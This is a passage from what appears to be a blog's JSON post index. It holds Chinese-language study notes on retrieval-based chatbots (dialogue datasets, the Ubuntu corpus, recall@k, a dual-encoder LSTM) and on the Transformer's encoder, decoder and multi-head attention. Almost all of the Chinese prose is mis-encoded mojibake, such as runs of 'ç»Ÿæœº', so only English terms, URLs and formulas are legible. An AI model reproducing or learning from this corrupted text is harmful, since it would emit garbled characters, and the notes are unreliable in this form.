ç»Ÿæœºå™¨ç¿»è¯‘æ¨¡å‹ä¸åŒçš„æ˜¯ï¼Œç”Ÿæˆå¼æ¨¡å‹çš„ä»»åŠ¡ä¸æ˜¯å°†ä¸€å¥è¯ç¿»è¯‘æˆå…¶ä»–è¯­è¨€çš„ä¸€å¥è¯ï¼Œè€Œæ˜¯è¾“å‡ºä¸€ä¸ªå›ç­”(response)ã€‚ â€‹ çŸ­å¯¹è¯ VS é•¿å¯¹è¯ â€‹ å¤„ç†é•¿å¯¹è¯å†…å®¹å°†æ›´åŠ å›°éš¾ï¼Œè¿™æ˜¯å› ä¸ºä½ éœ€è¦åœ¨å½“å‰å¯¹è¯çš„æƒ…å¢ƒä¸‹çŸ¥é“ä¹‹å‰çš„å¯¹è¯è¯´è¿‡ä»€ä¹ˆã€‚ å¼€æ”¾åŸŸ VS ç‰¹å®šé¢†åŸŸ â€‹ é¢å‘å¼€æ”¾åŸŸçš„èŠå¤©æœºå™¨äººæŠ€æœ¯é¢ä¸´æ›´å¤šå›°éš¾ï¼Œè¿™æ˜¯å› ä¸ºä¼šè¯å¯èƒ½æ¶‰åŠçš„é¢å¤ªå¹¿ï¼Œæ²¡æœ‰ä¸€ä¸ªæ¸…æ™°çš„ç›®æ ‡å’Œæ„å›¾ã€‚ â€‹ é¢å‘ç‰¹å®šé¢†åŸŸçš„ç›¸å…³æŠ€æœ¯åˆ™ç›¸å¯¹ç®€å•ä¸€äº›ï¼Œè¿™æ˜¯å› ä¸ºç‰¹å®šé¢†åŸŸç»™ä¼šè¯çš„ä¸»é¢˜è¿›è¡Œäº†é™åˆ¶ï¼Œç›®æ ‡å’Œæ„å›¾ä¹Ÿæ›´åŠ æ¸…æ™°ï¼Œå…¸å‹çš„ä¾‹å­æœ‰å®¢æœç³»ç»ŸåŠ©æ‰‹å’Œè´­ç‰©åŠ©æ‰‹ã€‚ é¢ä¸´çš„æŒ‘æˆ˜ å¦‚ä½•ç»“åˆä¸Šä¸‹æ–‡ä¿¡æ¯ â€‹ èŠå¤©æœºå™¨äººç³»ç»Ÿé€šå¸¸éœ€è¦åˆ©ç”¨ä¸€äº›ä¸Šä¸‹æ–‡ä¿¡æ¯(Context)ï¼Œè¿™é‡Œçš„ä¸Šä¸‹æ–‡ä¿¡æ¯åŒ…æ‹¬äº†å¯¹è¯è¿‡ç¨‹ä¸­çš„è¯­è¨€ä¸Šä¸‹æ–‡ä¿¡æ¯å’Œç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ç­‰ã€‚åœ¨é•¿å¯¹è¯ä¸­äººä»¬å…³æ³¨çš„æ˜¯ä¹‹å‰è¯´äº†ä»€ä¹ˆå†…å®¹ä»¥åŠäº§ç”Ÿäº†ä»€ä¹ˆå†…å®¹çš„äº¤æ¢ï¼Œè¿™æ˜¯è¯­è¨€ä¸Šä¸‹æ–‡ä¿¡æ¯çš„å…¸å‹ã€‚ è¯­ä¹‰ä¸€è‡´æ€§ â€‹ æœºå™¨äººé¢å¯¹ç›¸åŒè¯­ä¹‰è€Œä¸åŒå½¢å¼çš„é—®é¢˜åº”è¯¥ç»™äºˆä¸€è‡´çš„å›å¤ï¼Œä¾‹å¦‚è¿™ä¸¤ä¸ªé—®é¢˜[How old are you?]å’Œ[Whatâ€™s your age?]ï¼Œå¾ˆæœ‰å¯èƒ½ä¸æ˜¯ä¸€ä¸ªä¸ªä½“ã€‚æœ€å¤§çš„åŸå› åœ¨äºè®­ç»ƒæ¨¡å‹çš„æ•°æ®æ¥æºäºå¤§é‡ä¸åŒçš„ç”¨æˆ·ï¼Œè¿™å¯¼è‡´æœºå™¨äººå¤±å»äº†å›ºå®šç»Ÿä¸€çš„äººæ ¼ã€‚ å¯¹è¯æ¨¡å‹çš„è¯„æµ‹ â€‹ åœ¨å¼€æ”¾åŸŸä¸­çš„å¯¹è¯ç³»ç»Ÿæ²¡æœ‰ä¸€ä¸ªæ¸…æ™°çš„ä¼˜åŒ–ç›®æ ‡ã€‚ç”¨äºæœºå™¨ç¿»è¯‘çš„è¯„æµ‹æŒ‡æ ‡BLEUä¸èƒ½é€‚ç”¨äºæ­¤ï¼Œæ˜¯å› ä¸ºå®ƒçš„è®¡ç®—åŸºç¡€æ˜¯è¯­è¨€è¡¨é¢ä¸Šçš„åŒ¹é…ç¨‹åº¦ï¼Œè€Œå¯¹è¯ä¸­çš„å›ç­”å¯ä»¥æ˜¯å®Œå…¨ä¸åŒè¯å‹ä½†è¯­ä¹‰é€šé¡ºçš„è¯­å¥ã€‚ æ„å›¾å’Œå›å¤å¤šæ ·æ€§ â€‹ ç”Ÿæˆå¼æ¨¡å‹ä¸­çš„ä¸€ä¸ªæ™®éé—®é¢˜æ˜¯ï¼Œå®ƒä»¬å¯èƒ½ç”Ÿæˆä¸€äº›é€šç”¨çš„å›ç­”ï¼Œä¾‹å¦‚[Thatâ€™s great!]å’Œ[I donâ€™t know]è¿™æ ·çš„å¯ä»¥åº”ä»˜è®¸å¤šçš„ç”¨æˆ·è¯¢é—®ã€‚ â€‹ å¦å¤–ï¼Œäººä»¬åœ¨å¯¹è¯è¿‡ç¨‹ä¸­çš„å›å¤ä¸è¯¢é—®æœ‰ä¸€å®šç‰¹å®šå…³ç³»ï¼Œæ˜¯æœ‰ä¸€å®šæ„å›¾çš„ï¼Œè€Œè®¸å¤šé¢å‘å¼€æ”¾åŸŸçš„æœºå™¨äººä¸å…·å¤‡ç‰¹å®šçš„æ„å›¾ã€‚ â€‹ ç›®å‰æ·±åº¦å­¦ä¹ çš„ä»·å€¼ä¸»è¦ä½“ç°åœ¨èƒ½å¤Ÿè·å–å¤§é‡æ•°æ®çš„ç‰¹å®šé¢†åŸŸã€‚ç›®å‰ä¸€ä¸ªæ— æ³•åšçš„äº‹æƒ…æ˜¯äº§ç”Ÿä¸€ä¸ªæœ‰æ„ä¹‰çš„å¯¹è¯ã€‚ å…¬å¼€è¯­æ–™ dgk_shooter_min.conv.zip ä¸­æ–‡ç”µå½±å¯¹ç™½è¯­æ–™ï¼Œå™ªéŸ³æ¯”è¾ƒå¤§ï¼Œè®¸å¤šå¯¹ç™½é—®ç­”å…³ç³»æ²¡æœ‰å¯¹åº”å¥½ The NUS SMS Corpus åŒ…å«ä¸­æ–‡å’Œè‹±æ–‡çŸ­ä¿¡æ¯è¯­æ–™ï¼Œæ®è¯´æ˜¯ä¸–ç•Œæœ€å¤§å…¬å¼€çš„çŸ­æ¶ˆæ¯è¯­æ–™ ChatterBotä¸­æ–‡åŸºæœ¬èŠå¤©è¯­æ–™ ChatterBotèŠå¤©å¼•æ“æä¾›çš„ä¸€ç‚¹åŸºæœ¬ä¸­æ–‡èŠå¤©è¯­æ–™ï¼Œé‡å¾ˆå°‘ï¼Œä½†è´¨é‡æ¯”è¾ƒé«˜ Datasets for Natural Language Processing è¿™æ˜¯ä»–äººæ”¶é›†çš„è‡ªç„¶è¯­è¨€å¤„ç†ç›¸å…³æ•°æ®é›†ï¼Œä¸»è¦åŒ…å«Question Answeringï¼ŒDialogue Systemsï¼Œ Goal-Oriented Dialogue Systemsä¸‰éƒ¨åˆ†ï¼Œéƒ½æ˜¯è‹±æ–‡æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨æœºå™¨ç¿»è¯‘ä¸ºä¸­æ–‡ï¼Œä¾›ä¸­æ–‡å¯¹è¯ä½¿ç”¨ å°é»„é¸¡ æ®ä¼ è¿™å°±æ˜¯å°é»„é¸¡çš„è¯­æ–™ï¼šxiaohuangji50w_fenciA.conv.zip ï¼ˆå·²åˆ†è¯ï¼‰ å’Œ xiaohuangji50w_nofenci.conv.zip ï¼ˆæœªåˆ†è¯ï¼‰ ç™½é¹­æ—¶ä»£ä¸­æ–‡é—®ç­”è¯­æ–™ ç”±ç™½é¹­æ—¶ä»£å®˜æ–¹è®ºå›é—®ç­”æ¿å—10,000+ é—®é¢˜ä¸­ï¼Œé€‰æ‹©è¢«æ ‡æ³¨äº†â€œæœ€ä½³ç­”æ¡ˆâ€çš„çºªå½•æ±‡æ€»è€Œæˆã€‚äººå·¥review raw dataï¼Œç»™æ¯ä¸€ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªå¯ä»¥æ¥å—çš„ç­”æ¡ˆã€‚ç›®å‰ï¼Œè¯­æ–™åº“åªåŒ…å«2907ä¸ªé—®ç­”ã€‚(å¤‡ä»½) Chat corpus repository chat corpus collection from various open sources åŒ…æ‹¬ï¼šå¼€æ”¾å­—å¹•ã€è‹±æ–‡ç”µå½±å­—å¹•ã€ä¸­æ–‡æ­Œè¯ã€è‹±æ–‡æ¨æ–‡ ä¿é™©è¡Œä¸šQAè¯­æ–™åº“ é€šè¿‡ç¿»è¯‘ insuranceQAäº§ç”Ÿçš„æ•°æ®é›†ã€‚train_dataå«æœ‰é—®é¢˜12,889æ¡ï¼Œæ•°æ® 141779æ¡ï¼Œæ­£ä¾‹ï¼šè´Ÿä¾‹ = 1:10ï¼› test_dataå«æœ‰é—®é¢˜2,000æ¡ï¼Œæ•°æ® 22000æ¡ï¼Œæ­£ä¾‹ï¼šè´Ÿä¾‹ = 1:10ï¼›valid_dataå«æœ‰é—®é¢˜2,000æ¡ï¼Œæ•°æ® 22000æ¡ï¼Œæ­£ä¾‹ï¼šè´Ÿä¾‹ = 1:10 åŸºäºå†…å®¹æ£€ç´¢å¼çš„èŠå¤©æœºå™¨äºº image â€‹ æ£€ç´¢å¼æ¨¡å‹çš„è¾“å…¥æ˜¯ä¸€æ®µä¸Šä¸‹æ–‡å†…å®¹ C (ä¼šè¯åˆ°ç›®å‰æœªçŸ¥çš„å†…å®¹ä¿¡æ¯) å’Œä¸€ä¸ªå¯èƒ½ä½œä¸ºå›å¤çš„å€™é€‰ç­”æ¡ˆï¼›æ¨¡å‹çš„è¾“å‡ºæ˜¯å¯¹è¿™ä¸ªå€™é€‰ç­”æ¡ˆçš„æ‰“åˆ†ã€‚å¯»æ‰¾æœ€åˆé€‚çš„å›å¤å†…å®¹çš„è¿‡ç¨‹æ˜¯ï¼šå…ˆå¯¹ä¸€å †å€™é€‰ç­”æ¡ˆè¿›è¡Œæ‰“åˆ†åŠæ’åºï¼Œæœ€åé€‰å‡ºåˆ†å€¼æœ€é«˜çš„é‚£ä¸ªæœ€ä¸ºå›å¤ã€‚ â€‹ Retrieval-Based Conversational Model in Tensorflowï¼šhttps://github.com/dennybritz/chatbot-retrieval/ â€‹ æ•°æ®å¯ä»¥åœ¨Google Driveæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ï¼šhttps://drive.google.com/open?id=1RIIbsS-vxR7Dlo2_v6FWHDFE7q1XPPgj â€‹ æ•°æ®æ–‡ä»¶éœ€è¦: 123456- glove.6B.50d.txt (Subfolder GloVe)- training_10000.csv (Subfolder MAIN FILES)- validation_1000.csv (Subfolder MAIN FILES)- testing_same_structure_1000.csv (Subfolder MAIN FILES)- testing_different_structure_100.csv (Subfolder MAIN FILES)- saved_model_10000_gpu.pt (Subfolder SAVED MODELS) â€‹ æ•°æ®é›†ä¸ºUbuntuå¯¹è¯æ•°æ®é›†ã€‚chatbot-retrieval/notebooks/Data Exploration.ipynbæ–‡ä»¶ä¸ºæ•°æ®åˆ†æã€‚ Ubuntuå¯¹è¯æ•°æ®é›† è®­ç»ƒé›† â€‹ è®­ç»ƒæ•°æ®æœ‰1,000,000æ¡å®ä¾‹ï¼Œå…¶ä¸­ä¸€åŠæ˜¯æ­£ä¾‹ï¼ˆlabelä¸º1ï¼‰ï¼Œä¸€åŠæ˜¯è´Ÿä¾‹ï¼ˆlabelä¸º0ï¼Œè´Ÿä¾‹ä¸ºéšæœºç”Ÿæˆï¼‰ã€‚ â€‹ æ¯æ¡å®ä¾‹åŒ…æ‹¬ä¸€æ®µä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆcontextï¼‰ï¼Œå³Queryï¼›å’Œä¸€æ®µå¯èƒ½çš„å›å¤å†…å®¹ï¼Œå³Responseï¼›Labelä¸º1è¡¨ç¤ºè¯¥Responseç¡®å®æ˜¯Queryçš„å›å¤ï¼ŒLabelä¸º0åˆ™è¡¨ç¤ºä¸æ˜¯ã€‚ â€‹ æ•°æ®é›†çš„ç”Ÿæˆä½¿ç”¨äº†NLTKå·¥å…·ï¼ŒåŒ…æ‹¬åˆ†è¯ã€stemmedã€lemmatizedç­‰æ–‡æœ¬é¢„å¤„ç†æ­¥éª¤ï¼›åŒæ—¶è¿˜ä½¿ç”¨äº†NERæŠ€æœ¯ï¼Œå°†æ–‡æœ¬ä¸­çš„å®ä½“ï¼Œå¦‚å§“åã€åœ°ç‚¹ã€ç»„ç»‡ã€URLç­‰æ›¿æ¢æˆç‰¹æ®Šå­—ç¬¦ã€‚è¿™äº›æ–‡æœ¬é¢„å¤„ç†å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯èƒ½å¤Ÿæå‡ä¸€äº›æ¨¡å‹çš„æ€§èƒ½ã€‚ â€‹ queryçš„å¹³å‡é•¿åº¦ä¸º86ä¸ªwordï¼Œè€Œresponseçš„å¹³å‡é•¿åº¦ä¸º17ä¸ªwordã€‚ æµ‹è¯•é›†å’ŒéªŒè¯é›† â€‹ ä¸è®­ç»ƒé›†ä¸åŒï¼Œåœ¨æµ‹è¯•é›†å’ŒéªŒè¯é›†ä¸­ï¼Œå¯¹äºæ¯ä¸€æ¡å®ä¾‹ï¼Œæœ‰ä¸€ä¸ªæ­£ä¾‹å’Œä¹ä¸ªè´Ÿä¾‹æ•°æ®ï¼ˆä¹Ÿç§°ä¸ºå¹²æ‰°æ•°æ®ï¼‰ã€‚æ¨¡å‹çš„ç›®æ ‡åœ¨äºç»™æ­£ä¾‹çš„å¾—åˆ†å°½å¯èƒ½çš„é«˜ï¼Œè€Œç»™è´Ÿä¾‹çš„å¾—åˆ†å°½å¯èƒ½çš„ä½ã€‚ â€‹ è´Ÿä¾‹ç”Ÿæˆæ–¹æ³•å¯ä»¥å‚è€ƒè°·æ­Œçš„Smart Replyåˆ™ä½¿ç”¨äº†èšç±»æŠ€æœ¯ï¼Œå°†æ¯ä¸ªç±»çš„ä¸­å–ä¸€äº›ä½œä¸ºè´Ÿä¾‹ï¼Œè¿™æ ·ç”Ÿæˆè´Ÿä¾‹çš„æ–¹å¼æ˜¾å¾—æ›´åŠ åˆç†ï¼ˆè€ƒè™‘äº†è´Ÿä¾‹æ•°æ®çš„å¤šæ ·æ€§ï¼ŒåŒæ—¶å‡å°‘æ—¶é—´å¼€é”€ï¼‰ã€‚ è¯„æµ‹ â€‹ æ¨¡å‹çš„è¯„æµ‹recall@kï¼Œå³ç»æ¨¡å‹å¯¹å€™é€‰çš„responseæ’åºåï¼Œå‰kä¸ªå€™é€‰ä¸­å­˜åœ¨æ­£ä¾‹æ•°æ®ï¼ˆæ­£ç¡®çš„é‚£ä¸ªï¼‰çš„å æ¯”ï¼›æ˜¾ç„¶kå€¼è¶Šå¤§ï¼Œè¯¥æŒ‡æ ‡ä¼šè¶Šé«˜ã€‚ Dual Encoder LSTM Network å¤§è‡´çš„æµç¨‹å¦‚ä¸‹ï¼š Queryå’ŒResponseéƒ½æ˜¯ç»è¿‡åˆ†è¯çš„ï¼Œåˆ†è¯åæ¯ä¸ªè¯embeddedä¸ºå‘é‡å½¢å¼ã€‚åˆå§‹çš„è¯å‘é‡ä½¿ç”¨GloVe vectorsï¼Œä¹‹åè¯å‘é‡éšç€æ¨¡å‹çš„è®­ç»ƒä¼šè¿›è¡Œfine-tunedï¼ˆå®éªŒå‘ç°ï¼Œåˆå§‹çš„è¯å‘é‡ä½¿ç”¨GloVeå¹¶æ²¡æœ‰åœ¨æ€§èƒ½ä¸Šå¸¦æ¥æ˜¾è‘—çš„æå‡ï¼‰ã€‚ Queryå’ŒResponseç»è¿‡ç›¸åŒçš„RNNï¼ˆword by wordï¼‰ã€‚RNNæœ€ç»ˆç”Ÿæˆä¸€ä¸ªå‘é‡è¡¨ç¤ºï¼Œæ•æ‰äº†Queryå’ŒResponseä¹‹é—´çš„[è¯­ä¹‰è”ç³»]ï¼ˆå›¾ä¸­çš„cå’Œrï¼‰ï¼›è¿™ä¸ªå‘é‡çš„ç»´åº¦æ˜¯å¯ä»¥æŒ‡å®šçš„ï¼Œè¿™é‡ŒæŒ‡å®šä¸º256ç»´ã€‚ å°†å‘é‡cä¸ä¸€ä¸ªçŸ©é˜µMç›¸ä¹˜ï¼Œæ¥é¢„æµ‹ä¸€ä¸ªå¯èƒ½çš„å›å¤râ€™ã€‚å¦‚æœcä¸ºä¸€ä¸ª256ç»´çš„å‘é‡ï¼ŒMç»´256*256çš„çŸ©é˜µï¼Œä¸¤è€…ç›¸ä¹˜çš„ç»“æœä¸ºå¦ä¸€ä¸ª256ç»´çš„å‘é‡ï¼Œç›¸å½“äºä¸€ä¸ªç”Ÿæˆå¼çš„å›å¤å‘é‡ã€‚çŸ©é˜µMæ˜¯éœ€è¦è®­ç»ƒçš„å‚æ•°ã€‚ é€šè¿‡ç‚¹ä¹˜çš„æ–¹å¼æ¥é¢„æµ‹ç”Ÿæˆçš„å›å¤râ€™å’Œå€™é€‰çš„å›å¤rä¹‹é—´çš„ç›¸ä¼¼ç¨‹åº¦ï¼Œç‚¹ä¹˜ç»“æœè¶Šå¤§è¡¨ç¤ºå€™é€‰å›å¤ä½œä¸ºå›å¤çš„å¯ä¿¡åº¦è¶Šé«˜ï¼›ä¹‹åé€šè¿‡sigmoidå‡½æ•°ï¼Œè½¬æˆæ¦‚ç‡å½¢å¼ã€‚å›¾ä¸­æŠŠç¬¬(3)æ­¥å’Œç¬¬(4)æ­¥ç»“åˆåœ¨ä¸€èµ·äº†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"retireval","slug":"retireval","permalink":"https://racleray.github.io/tags/retireval/"}]},{"title":"Transformer Model","slug":"Transformer-Model","date":"2020-07-07T09:30:12.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/7c7eb002.html","link":"","permalink":"https://racleray.github.io/posts/7c7eb002.html","excerpt":"Transformer ä¸­ä¸¤ä¸ªä»»æ„è¾“å…¥çš„ä¿¡å·å…³è”çš„å¼€é”€ä¼šå‡å°‘åˆ°ä¸€ä¸ªå›ºå®šçš„è¿ç®—é‡çº§ï¼Œä½¿ç”¨ Multi-Head Attention æ³¨æ„åŠ›æœºåˆ¶å¯ä»¥é«˜æ•ˆåœ°å¹¶è¡ŒåŒ–ï¼Œå¹¶å †å å¤šå±‚çš„ç¥ç»ç½‘ç»œã€‚","text":"1.Transformeræ¨¡å‹ â€‹ åºåˆ—è®¡ç®—ä¸­ï¼Œä¼ ç»Ÿçš„RNNåœ¨é¢„æµ‹ä¸‹ä¸€ä¸ªç¬¦å·ï¼ˆtokenï¼‰çš„æ—¶å€™ï¼Œä¼šå¯¹ä»¥å¾€çš„å†å²ä¿¡æ¯æœ‰å¾ˆå¼ºçš„ä¾èµ–ï¼Œä½¿å¾—éš¾ä»¥å……åˆ†åœ°å¹¶è¡ŒåŒ–ï¼Œä¹Ÿæ— æ³•å¾ˆå¥½åœ°åŠ æ·±ç½‘ç»œçš„å±‚çº§ç»“æ„ã€‚ â€‹ è€Œå¯¹äºä¼ ç»Ÿçš„åŸºäºCNNçš„ç¥ç»æœºå™¨ç¿»è¯‘æ¨¡å‹ï¼Œä¸¤ä¸ªä»»æ„è¾“å…¥ä¸è¾“å‡ºä½ç½®çš„ä¿¡å·å…³è”æ‰€éœ€è¦çš„è¿ç®—æ•°é‡ä¸å®ƒä»¬çš„ä½ç½®è·ç¦»æˆæ­£æ¯”ï¼ŒFacebookæå‡ºçš„CNN NMT ä¸ºçº¿æ€§å¢é•¿ã€‚ â€‹ è¿™ä¸¤ç§å¸¸è§çš„ç»“æ„ä½¿å¾—å­¦ä¹ è¾ƒè¿œä½ç½®çš„ä¾èµ–å…³ç³»ï¼ˆlong-term dependencyï¼‰éå¸¸å›°éš¾ã€‚ â€‹ åœ¨ Transformer ä¸­ï¼Œä¸¤ä¸ªä»»æ„è¾“å…¥çš„ä¿¡å·å…³è”çš„å¼€é”€ä¼šå‡å°‘åˆ°ä¸€ä¸ªå›ºå®šçš„è¿ç®—æ•°é‡çº§ï¼Œä½¿ç”¨ Multi-Head Attention æ³¨æ„åŠ›æœºåˆ¶å¯ä»¥å®Œå…¨è„±ç¦»RNNåŠCNNçš„ç»“æ„ï¼Œä½¿å¾—Transformerå¯ä»¥é«˜æ•ˆåœ°å¹¶è¡ŒåŒ–ï¼Œå¹¶å †å å¤šå±‚çš„ç½‘ç»œã€‚ â€‹ è‡ªæ³¨æ„åŠ›ï¼ˆSelf-attentionï¼‰ï¼Œæ˜¯ä¸€ç§æ¶‰åŠå•åºåˆ—ä¸åŒä½ç½®çš„æ³¨æ„åŠ›æœºåˆ¶ï¼Œå¹¶èƒ½è®¡ç®—åºåˆ—çš„è¡¨å¾ã€‚è‡ªæ³¨æ„åŠ›è¿™ç§åœ¨åºåˆ—å†…éƒ¨æ‰§è¡Œ Attention çš„æ–¹æ³•å¯ä»¥è§†ä¸ºæœç´¢åºåˆ—å†…éƒ¨çš„éšè—å…³ç³»ï¼Œè¿™ç§å†…éƒ¨å…³ç³»å¯¹äºç¿»è¯‘ä»¥åŠåºåˆ—ä»»åŠ¡çš„æ€§èƒ½éå¸¸é‡è¦ã€‚ 1.1 ç¼–ç å™¨ encoder ç¼–ç å™¨encoderç”±6å±‚ç»“æ„ä¸€æ ·çš„ç½‘ç»œå±‚ç»„æˆï¼Œæ¯ä¸€å±‚æœ‰2ä¸ªå­å±‚ï¼š ç¬¬ä¸€ä¸ªå­å±‚æ˜¯multi-head self-attention Layer ç¬¬äºŒä¸ªå­å±‚æ˜¯ä¸€ä¸ªåŸºäºä½ç½®ç¼–ç çš„å…¨è¿æ¥ç½‘ç»œå±‚ï¼ˆposition-wise fully connected feed-forward networkï¼‰ ä¼šä½¿ç”¨æ®‹å·®è¿æ¥çš„æ–¹å¼ï¼Œåˆ†åˆ«å¯¹æ¯ä¸ªå­å±‚çš„è¾“å…¥åŠ åˆ°è¿™ä¸ªå­å±‚çš„è¾“å‡ºä¸Šï¼Œç„¶åå†æ¥ä¸€ä¸ªLayer normalizationçš„å½’ä¸€åŒ–å±‚ã€‚ â€‹ \\[ \\text{LayerNorm}(x+\\text{Sublayer}(x)) \\] æ‰€æœ‰çš„embeddingåŠhidden stateçš„ç»´åº¦éƒ½æ˜¯512 1.2 è§£ç å™¨ decoder è§£ç å™¨decoderç”±6å±‚ç»“æ„ä¸€æ ·çš„ç½‘ç»œå±‚ç»„æˆï¼Œæ¯ä¸€å±‚é™¤äº†è·Ÿencodeäººä¸€æ ·æœ‰2ä¸ªå­å±‚ä»¥å¤–ï¼Œè¿˜æœ‰ç¬¬3ä¸ªå­å±‚ ç¬¬ä¸€ä¸ªå­å±‚æ˜¯multi-head self-attention Layer ç¬¬äºŒä¸ªå­å±‚æ˜¯ä¸€ä¸ªåŸºäºä½ç½®ç¼–ç çš„å…¨è¿æ¥ç½‘ç»œå±‚ï¼ˆposition-wise fully connected feed-forward networkï¼‰ ç¬¬ä¸‰ä¸ªå­å±‚ç”¨äºå¯¹encoderçš„è¾“å‡ºå‘é‡è¿›è¡Œmulti-head attention åŒæ ·çš„ï¼Œä¼šä½¿ç”¨æ®‹å·®è¿æ¥çš„æ–¹å¼ï¼Œç„¶åå†æ¥ä¸€ä¸ªLayer normalizationçš„å½’ä¸€åŒ–å±‚ã€‚ \\[ \\text{LayerNorm}(x+\\text{Sublayer}(x))\\\\ \\] decoderè¿˜éœ€è¦å°†è¿˜æ²¡æœ‰ç”Ÿæˆçš„åç»­åºåˆ—æ©ç›–ï¼ˆmaskingï¼‰ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢decoderåœ¨åšself-attentionçš„æ—¶å€™å…³æ³¨åˆ°åç»­è¿˜æœªç”Ÿæˆçš„å•è¯ä¸Šå»ã€‚ 1.3 æ³¨æ„åŠ›æœºåˆ¶ ä¼ ç»Ÿçš„æ³¨æ„åŠ›æœºåˆ¶ï¼Œä¹Ÿç§°ä¸ºscaled Dot-Product Attentionï¼Œå¯ä»¥çœ‹æˆæ˜¯æœ‰ä¸€ä¸ªè¯¢é—®çš„è¯ï¼ˆqueryï¼‰ï¼Œå»è·Ÿä¸€å †å“ˆå¸Œè¡¨ä¸­çš„é”®å€¼å¯¹ï¼ˆkey-value pairï¼‰è¿›è¡ŒåŒ¹é…ï¼Œæ‰¾åˆ°æœ€ç›¸å…³çš„é”®ï¼ˆkeyï¼‰ï¼Œä¹‹åè¿”å›è¯¥é”®æ‰€å¯¹åº”çš„å€¼ï¼ˆvalueï¼‰ã€‚é€šå¸¸çš„ï¼Œå¦‚æœåªè¿”å›ä¸€ä¸ªkeyæ‰€å¯¹åº”çš„valueï¼Œç§°ä¹‹ä¸ºhard attentionã€‚å¦‚æœå¯¹æ‰€æœ‰çš„keyéƒ½è®¡ç®—ä¸€ä¸ªç›¸å…³ç³»æ•°ï¼Œï¼ˆä¹Ÿç§°ä¹‹ä¸ºattention weightï¼‰ï¼Œå¯ä»¥å°†æ‰€æœ‰keyå¯¹åº”çš„valueè¿›è¡ŒåŠ æƒæ±‚å’Œï¼ˆweighted sumï¼‰è¿™æ ·çš„æ“ä½œç§°ä¹‹ä¸ºsoft attentionã€‚ \\[\\text{Attention}(Q,K,V) = \\text{softmax}\\left({QK^T \\over \\sqrt{d_k}}\\right)V\\] å…¶ä¸­æ‰€æœ‰çš„queryå’Œkeyéƒ½æ˜¯ç»´åº¦ä¸º\\(d_k\\)çš„å‘é‡ï¼Œå°†è¿™äº›å‘é‡åˆ†åˆ«å åœ¨ä¸€èµ·å½¢æˆ \\(Q\\in\\mathbb{R}^{|Q|\\times d_k}, K\\in\\mathbb{R}^{|K|\\times d_k}\\)çš„çŸ©é˜µã€‚ æ‰€æœ‰çš„valueéƒ½æ˜¯ç»´åº¦ä¸º\\(d_v\\)çš„å‘é‡ï¼Œå°†è¿™äº›å‘é‡å åœ¨ä¸€èµ·å½¢æˆ\\(V\\in\\mathbb{R}^{|V|\\times d_k}\\) è¿™é‡Œå¦‚æœç»´åº¦\\(d_k\\)å¾ˆå¤§çš„æ—¶å€™ï¼Œä¸¤ä¸ªå‘é‡çš„ä¹˜ç§¯ä¼šå˜å¾—å¾ˆå¤§ï¼Œä½¿å¾—softmaxä¼šå¾—åˆ°éå¸¸å°çš„æ•°å€¼ï¼Œæ‰€ä»¥ä¼šåœ¨è¿™é‡Œé™¤ä»¥\\(\\sqrt{d_k}\\)æ¥æŠµæ¶ˆè¿™ä¸ªå½±å“ã€‚ 1.4 Multi-Head Attention è¿™é‡Œå‡è®¾\\(Q,~K,~V\\in \\mathbb{R}^{d_\\text{model}}\\)éƒ½åœ¨ä¸€ä¸ª\\({d_\\text{model}}\\)ç»´åº¦çš„ç©ºé—´ä¸­ ä½¿ç”¨hä¸ªä¸ä¸€æ ·æƒé‡çš„çº¿æ€§æ˜ å°„å‡½æ•°\\((QW^Q_i, KW^K_i, VW^V_i)\\)å°†Q, K, Våˆ†åˆ«æ˜ å°„åˆ°\\(d_k,~d_k,~d_v\\)ç©ºé—´ä¸­ å¯¹æ˜ å°„ä¹‹åçš„Q, K, V åšhæ¬¡attentionï¼Œå¹¶å°†hä¸ªattention headè¿æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªæ–°çš„å‘é‡ æœ€åå†å°†è¿™ä¸ªå‘é‡æ˜ å°„åˆ°\\(d_\\text{model}\\)ç©ºé—´ï¼Œä½œä¸ºä¸‹ä¸€å±‚çš„è¾“å…¥ â€‹ \\[ \\text{MultiHead}(Q,K,V) = \\text{Concat}(\\text{head}_1,\\cdots, \\text{head}_h) W^O \\\\ \\text{head}_i = \\text{Attention}(QW^Q_i, KW^K_i, VW^V_i) \\] å…¶ä¸­\\(W^Q_i\\in \\mathbb{R}^{d_\\text{model}\\times d_k}, W^K_i\\in \\mathbb{R}^{d_\\text{model}\\times d_k}, W^V_i\\in \\mathbb{R}^{d_\\text{model}\\times d_v}, W^O\\in \\mathbb{R}^{hd_v\\times d_\\text{model}}\\), å¸¸è§çš„è®¾ç½®\\(h=8,d_k=d_v=d_\\text{model}/h=64\\) æ¨¡å‹å›¾ åº”ç”¨ å°†decoderä¸Šä¸€ä¸ªæ—¶åˆ»çš„hidden state ä½œä¸ºqueryï¼Œå°†encoderçš„æœ€é¡¶å±‚çš„æ‰€æœ‰è¾“å‡ºçš„hidden stateä½œä¸ºkeyå’Œvalueï¼Œè¿™æ ·å¯ä»¥ç±»ä¼¼ä¼ ç»Ÿçš„attentionæœºåˆ¶ä¸€æ ·å»å‘ç°æºè¯­è¨€å•è¯ä¸ç›®æ ‡è¯­è¨€å•è¯ä¹‹é—´çš„è”ç³» encoderæœ¬èº«ä¼šå¯¹æºè¯­è¨€å•è¯è¿›è¡Œmulti-head self attentionï¼Œå…¶ä¸­queryï¼Œkeyï¼Œvalueéƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸Šä¸€å±‚ä¸­è¾“å‡ºçš„å•è¯çš„hidden stateï¼Œæ¯ä¸€ä¸ªæ—¶åˆ»è®¡ç®—å‡ºæ¥çš„context vectoréƒ½ä¼šä½œä¸ºè¯¥å±‚è¾“å‡ºçš„æ–°çš„å•è¯çš„hidden stateï¼Œå¹¶ä½œä¸ºä¸‹ä¸€å±‚çš„è¾“å…¥ã€‚ 